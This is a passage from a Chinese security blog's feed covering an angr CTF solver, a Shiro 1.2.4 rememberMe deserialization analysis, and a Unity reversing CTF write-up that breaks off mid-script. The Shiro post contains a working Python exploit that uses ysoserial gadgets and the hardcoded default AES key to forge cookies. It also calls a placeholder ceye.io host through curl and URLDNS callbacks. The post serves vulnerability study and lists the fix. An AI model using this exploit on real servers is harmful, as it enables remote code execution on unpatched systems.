<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./very_success&quot;</span>, load_options=&#123;<span class="string">&quot;auto_load_libs&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">s = p.factory.entry_state(addr=<span class="number">0x401084</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填入函数的参数</span></span><br><span class="line">s.mem[s.regs.esp:].dword = <span class="number">0x401064</span></span><br><span class="line">s.mem[s.regs.esp+<span class="number">4</span>:].dword = <span class="number">0x4010E4</span></span><br><span class="line">s.mem[s.regs.esp+<span class="number">8</span>:].dword = <span class="number">0x402159</span></span><br><span class="line">s.mem[s.regs.esp+<span class="number">12</span>:].dword = <span class="number">37</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在第三个参数创建一个符号向量</span></span><br><span class="line">s.memory.store(<span class="number">0x402159</span>, claripy.BVS(<span class="string">&quot;flag&quot;</span>, <span class="number">8</span>*<span class="number">37</span>))</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] init ok&quot;</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=<span class="number">0x40106B</span>, avoid=<span class="number">0x401072</span>)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] found!&quot;</span>)</span><br><span class="line">    x = sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag, cast_to=<span class="built_in">bytes</span>).strip(<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#funnyre-7-solves">WUST-CTF 2020 官方 Writeup</a></p>
<p><a href="https://xz.aliyun.com/u/11261">先知社区-Badrer</a></p>
<p><a href="https://xz.aliyun.com/t/7117">angr 系列教程(一）核心概念及模块解读</a></p>
]]></content>
      <tags>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro 1.2.4 反序列化链分析</title>
    <url>/2020/08/01/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git  </span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4  </span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>编辑<code>pom.xml</code>，添加如下jar包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  需要设置编译的版本 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">           <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">.....</span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>创建<code>~/.m2/toolchains.xml</code>文件，添加jdk1.6环境</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">toolchains</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">toolchain</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">type</span>&gt;</span>jdk<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">provides</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">vendor</span>&gt;</span>sun<span class="tag">&lt;/<span class="name">vendor</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">provides</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">jdkHome</span>&gt;</span>D:\Java\jdk1.6.0_45<span class="tag">&lt;/<span class="name">jdkHome</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">toolchain</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">toolchains</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编译成war包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd shiro/samples/web  </span><br><span class="line">mvn package -D maven.skip.test=true</span><br></pre></td></tr></table></figure>

<p>把生成的<code>samples-web-1.2.4.war</code>放到Tomcat的webapps目录下，为了方便重命名为<code>shiro.war</code></p>
<p>启动tomcat，访问<code>http://127.0.0.1:8080/shiro/</code>，搭建完成</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223304.png" alt="image-20200728102626680"></p>
<h2 id="漏洞链分析"><a href="#漏洞链分析" class="headerlink" title="漏洞链分析"></a>漏洞链分析</h2><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><p>因为漏洞出现在<code>Remember Me</code>，所以我们记得勾选，然后再进行登录</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223410.png" alt="image-20200731112027369"></p>
<p>在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code> 处下个断点，传入的三个参数都包含了我们登陆的信息</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223420.png" alt="image-20200731112430152"></p>
<p>跟进<code>forgetIdentity</code>方法，它会对<code>subject</code>变量进行处理</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223426.png" alt="image-20200731112640520"></p>
<p>继续跟进<code>forgetIdentity</code>方法，我们会发现它主要是对<code>set-cookie</code>的一些处理</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223444.png" alt="image-20200731112808224"></p>
<p>继续跟进下一步，首先会判断我们有无设置<code>Remember Me</code>，如果有的话就会进入<code>rememberIdentity</code>函数</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223449.png" alt="image-20200731113121803"></p>
<p>继续跟进，也是对用户的登录信息进行处理</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223456.png" alt="image-20200731113634580"></p>
<p>我们可以看到他们把用户信息序列化之后，会进行加密</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223502.png" alt="image-20200731113733542"></p>
<p>这里是加密函数，这一步是获取加密所采取的方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223506.png" alt="image-20200731113853889"></p>
<p>观察本地变量，我们可以看到它加密的方法用的是AES的CBC方式</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223544.png" alt="image-20200731114018051"></p>
<p>数据加密主要发生在这一步</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223745.png" alt="image-20200731141144566"></p>
<p><code>getEncryptionCipherKey</code>函数是获得加密所需要的<code>Key</code>，因为传入的是空参数，所以采用的是默认的<code>Key</code>，这个是可以直接在源码找到的</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223745.png" alt="image-20200731142820956"></p>
<p>然后会将序列化好的数据进行AES加密</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223822.png" alt="image-20200731141442083"></p>
<p>加密完之后就会返回加密的结果</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223809.png" alt="image-20200731114416038"></p>
<p>后面会对返回后的加密值进行进一步处理</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223802.png" alt="image-20200731114450542"></p>
<p>是对序列化后的值进行<code>Base64</code>加密后存放在<code>Cookie</code>中</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223822.png" alt="image-20200731114542521"></p>
<p>整个登录过程大致为这样</p>
<h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><p>要想找到解密的入口位置，首先我们需要在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code> 下个断点</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223851.png" alt="image-20200731143126894"></p>
<p>这是我们得到的调用链，根据函数名字我们可以知道，<code>getRememberedIdentity</code>是获取<code>cookie</code>中的<code>rememberMe</code>进行解析，所以我们可以选择在<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedIdentity</code>下一个断点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. decrypt:486, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">2. convertBytesToPrincipals:429, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">3. getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">4. getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</span><br></pre></td></tr></table></figure>

<p>然后我们跟进一下<code>getRememberedPrincipals</code>这个函数</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223933.png" alt="image-20200731152746429"></p>
<p>首先是是要得到<code>rememberMe</code>序列化后的值</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223939.png" alt="image-20200731153224590"></p>
<p>跟进以后可以看到是进行了<code>Base64.deocde</code>之后再返回序列化数据</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731223946.png" alt="image-20200731153715075"></p>
<p>到<code>convertBytesToPrincipals</code>函数应该就是<code>AES</code>解密的操作了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224004.png" alt="image-20200731153843497"></p>
<p>继续跟进解密函数</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224011.png" alt="image-20200731153944948"></p>
<p>然后获取加解密服务类进行解密，使用的<code>key</code>依然是默认<code>key</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224024.png" alt="image-20200731154036729"></p>
<p>首先是获取解密需要的<code>iv</code>值，后面就是很正常的<code>AES</code>解密步骤了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224048.png" alt="image-20200731151402487"></p>
<p>之后返回解密后的序列化值</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224111.png" alt="image-20200731155653747"></p>
<p>然后就是最后一步的反序列化</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224118.png" alt="image-20200731161249665"></p>
<p>后面是就调用<code>readObject</code>函数进行反序列化了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224124.png" alt="image-20200731161543385"></p>
<p>按理来说到这里就可以直接操作get shell了，但是这里还有另外一个问题</p>
<p>在@orange和@zsx文章中提到</p>
<blockquote>
<p>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
</blockquote>
<p>我们继续跟进<code>readObject</code>，我们会发现shiro重构了自己的<code>resolveClass</code>，这里使用的是<code>ClassUtils.forName</code></p>
<blockquote>
<p>而jdk原版的<code>resovleClass</code>是 <code>Class.forName</code> </p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224138.png" alt="image-20200731162304022"></p>
<p>跟进去发现其实底层是调用了<code>loadClass</code>函数</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200731224146.png" alt="image-20200731162553365"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>编写exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8080/shiro/&#x27;</span></span><br><span class="line">dns_server = <span class="string">&#x27;http://xxxxx.ceye.io&#x27;</span></span><br><span class="line">use_jar = [<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>]</span><br><span class="line">cmd = <span class="string">&#x27;touch /tmp/shiro.txt&#x27;</span></span><br><span class="line">jrmp_server_ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">jrmp_server_port = <span class="string">&#x27;9999&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">self_cmd</span>():</span><br><span class="line">	<span class="comment"># user-defined cmd</span></span><br><span class="line">	popen = subprocess.Popen(use_jar + [<span class="string">&#x27;CommonsCollections2&#x27;</span>, cmd], stdout=subprocess.PIPE)</span><br><span class="line">	payload = popen.stdout.read()</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">urldns</span>():</span><br><span class="line">	<span class="comment"># use URLDNS gadget</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;[*] test dns_server:\n<span class="subst">&#123;dns_server&#125;</span>&quot;</span>)</span><br><span class="line">	popen = subprocess.Popen(use_jar + [<span class="string">&#x27;URLDNS&#x27;</span>, dns_server], stdout=subprocess.PIPE)</span><br><span class="line">	payload = popen.stdout.read()</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jrmp</span>():</span><br><span class="line">	<span class="comment"># use JRMPClient gadget</span></span><br><span class="line">	<span class="comment"># Server: </span></span><br><span class="line">	<span class="comment"># java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections5 &#x27;curl http://xxxxx.ceye.io&#x27;</span></span><br><span class="line">	popen = subprocess.Popen(use_jar + [<span class="string">&#x27;JRMPClient&#x27;</span>, <span class="string">f&quot;<span class="subst">&#123;jrmp_server_ip&#125;</span>:<span class="subst">&#123;jrmp_server_port&#125;</span>&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">	payload = popen.stdout.read()</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">payload</span>):</span><br><span class="line">	<span class="comment"># AES encode</span></span><br><span class="line">	BS = AES.block_size</span><br><span class="line">	pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">	key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">	mode = AES.MODE_CBC</span><br><span class="line">	iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">	encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">	padding = pad(payload)</span><br><span class="line">	b64 = base64.b64encode(iv + encryptor.encrypt(padding)).decode()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&#x27;[*] send payload:\n<span class="subst">&#123;b64&#125;</span>&#x27;</span>)</span><br><span class="line">		res = rq.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: b64&#125;)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&#x27;[*] send finished&#x27;</span>)</span><br><span class="line">		<span class="comment"># print(f&quot;[*] response:\n&#123;res.text&#125;&quot;)</span></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&quot;[*] send failed:\n<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="comment"># exp(self_cmd())</span></span><br><span class="line">	<span class="comment"># exp(urldns())</span></span><br><span class="line">	exp(jrmp())</span><br></pre></td></tr></table></figure>

<blockquote>
<p>但是不知道为什么JRMP打不通，如果有师傅知道的可以指点一下</p>
</blockquote>
<p>推荐一个好用的工具：<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p>
<h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>针对这个问题shiro解决了自带的硬编码的问题，当然如果用户还是用硬编码的方式，一旦key泄漏，一样是会造成反序列化的问题。</p>
<p>官方针对这个问题的修复方式：</p>
<p>1、删除相关默认密钥</p>
<p>2、如果没有配置密钥，会随机生成一个密钥。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/">http://www.lmxspace.com/2019/10/17/Shiro-反序列化记录/</a></p>
<p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p>
<p><a href="https://www.cnblogs.com/paperpen/p/11312671.html">https://www.cnblogs.com/paperpen/p/11312671.html</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse中Unity的逆向</title>
    <url>/2021/03/21/Reverse%E4%B8%ADUnity%E7%9A%84%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<p>记录一下关于Unity程序的基本逆向思路</p>
<span id="more"></span>

<h2 id="Who-is-he"><a href="#Who-is-he" class="headerlink" title="Who is he"></a>Who is he</h2><blockquote>
<p>题目源于【SCTF2019】，考点为Unity程序逆向</p>
</blockquote>
<h3 id="dnspy分析"><a href="#dnspy分析" class="headerlink" title="dnspy分析"></a>dnspy分析</h3><p>题目是Unity程序，只有一段视频，一个输入框和一个点击按钮</p>
<p>因为.NET应用把所有的C#代码都打包在了<code>Assembly-CSharp.dll</code>，所以把<code>Who is he/Who is he_Data/Managed/Assembly-CSharp.dll</code>文件放入到dnspy分析</p>
<p>可以看到程序只是判断了提交的数据与程序某一段密文的解密结果是否相同，其中数据加密流程如下，是一个CBC模式的DES，而且给出了key，iv（和key一样）和密文</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103212021bc5cb718883dcc9f2f1e.png" alt="image-20210321172137884"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103212021542ba7569bce279fa908.png" alt="image-20210321172049937"></p>
<p>直接写解密脚本</p>
<blockquote>
<p>这里需要注意的是C#里面字符串默认是Unicode，每个字符后面补”\x00”，所以这里的key为”1\x002\x003\x004\x00”</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;1\x002\x003\x004\x00&quot;</span></span><br><span class="line">des = DES.new(key, DES.MODE_CBC, key)</span><br><span class="line">cipher = <span class="string">&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">plain = des.decrypt(cipher).decode()</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br><span class="line"><span class="comment"># He_P1ay_Basketball_Very_We11!Hahahahaha!</span></span><br></pre></td></tr></table></figure>

<p>但是这个flag是假的，所以这个<code>Assembly-CSharp.dll</code>其实打包的不是真正的源码，所以我们就得动态调式程序来获取真实值</p>
<h3 id="cheat-engine分析"><a href="#cheat-engine分析" class="headerlink" title="cheat engine分析"></a>cheat engine分析</h3><p>开外挂器查看其内存，在ce中搜索弹窗里面出现的字符串”Emmmmm”，发现一共有两处</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210321202185f0353d43ffa725a934.png" alt="image-20210321200237714"></p>
<p>两处Emmmmm的上下文我们都发现了不同的的密文和key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;t\x00e\x00s\x00t\x00&quot;</span></span><br><span class="line"><span class="comment"># key = &quot;1\x002\x003\x004\x00&quot;</span></span><br><span class="line">des = DES.new(key, DES.MODE_CBC, key)</span><br><span class="line">cipher = <span class="string">&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;</span></span><br><span class="line">cipher = <span class="string">&#x27;78 00 5A 00 57 00 44 00 5A 00 61 00 4B 00 45 00 68 00 57 00 4E 00 4D 00 43 00 62 00 69 00 47 00 59 00 50 00 42 00 49 00 6C 00 59 00 33 00 2B 00 61 00 72 00 6F 00 7A 00 4F 00 39 00 7A 00 6F 00 6E 00 77 00 72 00 59 00 4C 00 69 00 56 00 4C 00 34 00 6E 00 6A 00 53 00 65 00 7A 00 32 00 52 00 59 00 4D 00 32 00 57 00 77 00 73 00 47 00 6E 00 73 00 6E 00 6A 00 43 00 44 00 6E 00 48 00 73 00 37 00 4E 00 34 00 33 00 61 00 46 00 76 00 4E 00 45 00 35 00 34 00 6E 00 6F 00 53 00 61 00 64 00 50 00 39 00 46 00 38 00 65 00 45 00 70 00 76 00 54 00 73 00 35 00 51 00 50 00 47 00 2B 00 4B 00 4C 00 30 00 54 00 44 00 45 00 2F 00 34 00 30 00 6E 00 62 00 55 00 3D 00&#x27;</span></span><br><span class="line"><span class="comment"># cipher = &#x27;71 00 2B 00 77 00 38 00 39 00 59 00 32 00 32 00 72 00 4F 00 62 00 66 00 7A 00 78 00 67 00 73 00 71 00 75 00 63 00 35 00 51 00 78 00 62 00 62 00 68 00 39 00 5A 00 49 00 41 00 48 00 45 00 54 00 2F 00 4E 00 6E 00 63 00 6D 00 69 00 71 00 45 00 6F 00 36 00 37 00 52 00 72 00 44 00 76 00 7A 00 33 00 34 00 63 00 64 00 41 00 6B 00 30 00 42 00 61 00 6C 00 4B 00 57 00 68 00 4A 00 47 00 6C 00 32 00 43 00 42 00 59 00 4D 00 6C 00 72 00 38 00 70 00 50 00 41 00 3D 00&#x27;</span></span><br><span class="line">cipher = cipher.replace(<span class="string">&#x27; 00&#x27;</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(_, <span class="number">16</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> cipher])</span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">plain = des.decrypt(cipher).decode()</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br><span class="line"><span class="comment"># [right] She_P1ay_Black_Hole_Very_Wel1!LOL!XD!</span></span><br><span class="line"><span class="comment"># [tip] Oh no!This is a trick!!!</span></span><br></pre></td></tr></table></figure>

<p>所以我们最终的flag是<code>flag&#123;She_P1ay_Black_Hole_Very_Wel1!LOL!XD!&#125;</code></p>
<h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><blockquote>
<p>题目来源于【2019 红帽杯】</p>
</blockquote>
<h3 id="dnspy分析-1"><a href="#dnspy分析-1" class="headerlink" title="dnspy分析"></a>dnspy分析</h3><p>用dnspy打开<code>Assembly-CSharp.dll</code>，发现它的接口都是在<code>Interface.dll</code>中引入的</p>
<p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20210322141353479.png" alt="image-20210322141353479"></p>
<h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>把<code>Interface.dll</code>拖到IDA分析，找到输出flag的代码，代码量还挺大的，</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021032215059479ba02602d50b23ba6.png" alt="image-20210322144354551"></p>
<p>但是观察到该函数只接受一个a1参数，而且a1有一个约束条件，只在[0, 99]的范围内</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">GameObject</span><span class="params">(<span class="type">int</span> a1)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103221505f7d9ebc8122446219e45.png" alt="image-20210322144611115"></p>
<p>所以我们可以直接导入这个ddl进行爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, Manager</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">d</span>):</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    dll = ctypes.WinDLL(<span class="string">&quot;Interface.dll&quot;</span>)</span><br><span class="line">    dll.GameObject(d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    num = <span class="number">5</span></span><br><span class="line">    data = <span class="built_in">range</span>(<span class="number">100</span>)</span><br><span class="line">    pool = Pool(processes=num)</span><br><span class="line">    manager = Manager()</span><br><span class="line">    jobs = []</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        job = pool.apply_async(func, (d, ))</span><br><span class="line">        